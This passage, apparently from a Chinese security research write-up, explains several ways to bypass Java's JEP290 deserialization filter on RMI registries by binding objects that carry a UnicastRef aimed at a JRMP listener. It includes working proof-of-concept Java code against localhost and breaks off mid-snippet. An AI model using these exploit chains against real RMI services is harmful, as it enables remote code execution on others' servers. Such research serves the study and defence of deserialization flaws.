@@ -1,0 +1,183 @@
+但是跟之前不同的是：没有白名单的时候我们可以用到AnnotationInvocationHandler装载UnicastRef对象，再把它动态代理变成Remote对象。
+但是在JEP290之后有了白名单限制，AnnotationInvocationHandler对象被禁了。
+我们需要用到
+  3. 找一个同时继承实现两者的类或者一个实现Remote，并将UnicastRef类型作为其一个字段的类。这样只需要把我们的UnicastRef对象塞入这个类中，然后直接塞进`register.bind(String,Remote)`中就可以了。
+##### 1.绕过客户端-自实现协议
+第一类实现bind底层协议，太过底层，感觉可以根据Barmie改，但是有点磕不动，放放。
+> 但是在最后我们还是以两种方式自实现了lookup的协议。
+##### 2.动态代理-自定义
+代码参考github-Bypass290_proxy.java
+我们自定义一个PocHandler拦截器：
+    public static class PocHandler implements InvocationHandler, Serializable {
+        private RemoteRef ref;//来放我们的UnicastRef对象
+        protected PocHandler(RemoteRef newref) {//构造方法，来引入UnicastRef
+            ref = newref;
+        }
+        @Override
+        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+            return this.ref //只是为了满足拦截类的格式，随便写
+        }
+    }
+把生成UnicastRef放入PocHandler拦截器，然后转变为Remote类型。
+    public static void main(String[] args) throws Exception{
+            String jrmpListenerHost = "127.0.0.1";
+            int jrmpListenerPort = 1199;
+            UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+            Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class[]{Remote.class}, new PocHandler(unicastRef));
+            Registry registry = LocateRegistry.getRegistry(1099);//本地测试
+            registry.bind("2333", remote);
+        }
+老样子JRMP-listener一开，然后打ServerAndRegister
+完美，没问题
+>
+> 同时这里存在一个非常神奇的问题，本以为客户端自定义一个PocHandler拦截器，rmi服务端是不会有这个拦截器的，所以在反序列化的时候会因为没有类而报错。但是实际上远程利用是可以成功的。
+>
+> 从报错中我们也可以看到，服务端确实找不到这个类，但是会触发代码执行，之前bind绑定也说过这个问题，推测由于先反序列化类中的变量，然后恢复成类导致的。
+##### 2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）
+> 这其实就是Ysoserial-Payload-JRMPClient模块生成的payload的实现逻辑
+假如不自定义一个拦截器，去jdk环境中寻找也是可以找到的—— **RemoteObjectInvocationHandler**
+  1. 它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）
+  2. 同时是一个 拦截器。（这表示我们可以通过动态代理把他改成任意的接口）
+    public class RemoteObjectInvocationHandler
+        extends RemoteObject
+        implements InvocationHandler //表示是一个拦截器
+    {
+    //构造函数，传入一个RemoteRef接口类型的变量
+        public RemoteObjectInvocationHandler(RemoteRef ref) {
+            super(ref);
+            if (ref == null) {
+                throw new NullPointerException();
+            }
+        }
+    //而UnicastRef类型实现RemoteRef接口，即可以传入
+    //public class UnicastRef implements RemoteRef {
+`super(ref);`：
+    public abstract class RemoteObject implements Remote, java.io.Serializable {
+        /** The object's remote reference. */
+        transient protected RemoteRef ref;
+     //super(ref)的内容，可以成功塞入变量中
+         protected RemoteObject(RemoteRef newref) {
+            ref = newref;
+        }
+然而这里会有一个神奇的问题，我们知道`transient`修饰的变量在正常的序列化过程中是不会被序列化的（会为空）。那我们特制的ref不就因为无论怎么样都不序列化了？
+但理论的确如此，但实际不是的，因为我们还知道如果这个类对于writeobject、readobject进行了重写，就会进入这个方法进行特殊的逻辑执行。
+`java.rmi.server.RemoteObject#writeObject`
+    private void writeObject(java.io.ObjectOutputStream out)
+            throws java.io.IOException, java.lang.ClassNotFoundException
+        {
+            if (ref == null) {
+                throw new java.rmi.MarshalException("Invalid remote object");
+            } else {
+                String refClassName = ref.getRefClass(out);
+                if (refClassName == null || refClassName.length() == 0) {
+                    //不会进入的地方....
+                } else {
+                    /*
+                     * Built-in reference class specified, so delegate
+                     * to reference to write out its external form.
+                     */
+                     //我们的序列化操作会进入到这里对于ref进行序列化
+                    out.writeUTF(refClassName);
+                    ref.writeExternal(out);
+                    //在这里通过writeExternal来写入了ref
+                    //（transient类型的变量可以通过writeExternal来写入序列化）
+                }
+            }
+        }
+在Remoteobject的writeobject方法中可以完成对于同时，我们也可以通过把序列化结果写入文件看序列化结果来证明ref的序列化不会受到影响。
+那么在确定 **RemoteObjectInvocationHandler** 可以填入一个 **UnicastRef对象**
+并且不影响序列化之后。接下来就是利用动态代理进行类型转变
+    public class Bypass290 {
+        //省略generateUnicastRef方法
+        public static void main(String[] args) throws Exception{
+            //获取UnicastRef对象
+            String jrmpListenerHost = "127.0.0.1";//本地测试
+            int jrmpListenerPort = 1199;
+            UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+            //通过构造函数封装进入RemoteObjectInvocationHandler
+            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+            //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类
+            //所以接下来bind可以填入proxy
+            Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),
+                                                               new Class[]{Registry.class}, obj);
+            //触发漏洞
+            Registry registry = LocateRegistry.getRegistry(1099);//本地测试
+            registry.bind("hello", proxy);//填入payload
+        }
+    }
+##### 3.找一个带UnicastRef类型参数的实现Remote接口的类
+那么第三种情况，直接不用动态代理构造去弄成Remote接口，直接找一个实现Remote接口的类。
+  1. 这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）
+  2. 这个类要是Remote接口的
+###### RemoteObjectInvocationHandler
+其实 **RemoteObjectInvocationHandler** 本身就是一个实现了Remote接口的类。
+    //RemoteObjectInvocationHandler定义，继承自RemoteObject
+    public class RemoteObjectInvocationHandler
+        extends RemoteObject
+        implements InvocationHandler
+    //RemoteObject定义，实现了Remote接口
+    public abstract class RemoteObject implements Remote, java.io.Serializable {
+所以上面 **ysoserial-payload-JRMPClient**
+中利用动态代理修改RemoteObjectInvocationHandler接口是多余的。
+直接注释了动态代理操作也可以打。
+    public static void main(String[] args) throws Exception{
+        //获取UnicastRef对象
+        String jrmpListenerHost = "127.0.0.1";//本地测试
+        int jrmpListenerPort = 1199;
+        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
+        //通过构造函数封装进入RemoteObjectInvocationHandler
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类
+        //所以接下来bind可以填入proxy 注释
+        //        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),
+        //                new Class[]{Registry.class}, obj);
+        //触发漏洞
+        Registry registry = LocateRegistry.getRegistry(1099);//本地测试
+        //        registry.bind("hello", proxy);//填入payload
+        registry.bind("hello", obj);//填入payload
+    }
+可以发现我们的RemoteObjectInvocationHandler继承自RemoteObject。
+  1. 而UnicastRef对象是在RemoteObject类中赋值的
+  2. RemoteObject类又是一个Remote接口
+那么理论上来说所有RemoteObject的子类都是可以的，我们可以通过ctrl+alt+B来查看子类。
+我们选取 **RMIConnectionImpl_Stub** 和 **UnicastRemoteObject** 来举例说明
+###### RMIConnectionImpl_Stub
+RMIConnectionImpl_Stub是可以利用的。
+是Remote接口：
+    //RMIConnectionImpl_Stub类定义，继承自RemoteStub类
+    public final class RMIConnectionImpl_Stub
+        extends java.rmi.server.RemoteStub
+        implements javax.management.remote.rmi.RMIConnection{
+    //java.rmi.server.RemoteStub 定义，继承自RemoteObject类
+    abstract public class RemoteStub extends RemoteObject {
+    //RemoteObject定义，实现Remote接口
+    public abstract class RemoteObject implements Remote, java.io.Serializable {
+利用构造方法可以容纳一个UnicastRef对象：
+    //javax.management.remote.rmi.RMIConnectionImpl_Stub#RMIConnectionImpl_Stub 构造方法
+    public RMIConnectionImpl_Stub(java.rmi.server.RemoteRef ref) {
+        super(ref);
+        }
+    //java.rmi.server.RemoteStub#RemoteStub(java.rmi.server.RemoteRef) 构造方法
+     protected RemoteStub(RemoteRef ref) {
+            super(ref);
+        }
+    //java.rmi.server.RemoteObject#RemoteObject(java.rmi.server.RemoteRef) 构造方法
+    protected RemoteObject(RemoteRef newref) {
+            ref = newref;
+        }
+攻击代码就很简单，跟RemoteObjectInvocationHandler完全一致改个参数就完事了，放个图表示可以：
+> 详细代码参考github Bypass290.java
+###### UnicastRemoteObject
+UnicastRemoteObject实际上满足我们说的所有条件，但是是不可以利用的。
+它的确是Remote接口：
+    //java.rmi.server.UnicastRemoteObject定义
+    public class UnicastRemoteObject extends RemoteServer {
+    //java.rmi.server.RemoteServer定义
+    public abstract class RemoteServer extends RemoteObject//这个就是了 不赘述
+    {
+同样由于继承自RemoteObject，所以同样有一个RemoteObject类中的ref参数，但是在UnicastRemoteObject类中，没有使用到。
+我们实际上也是可以操控这个变量的，之前是通过构造函数直接赋值，现在可以通过反射机制来赋值，实现如下：
+    //3.UnicastRemoteObject
+     //3.1.获取到UnicastRemoteObject的实例
+     Class clazz = Class.forName("java.rmi.server.UnicastRemoteObject");
+     Constructor m = clazz.getDeclaredConstructor();
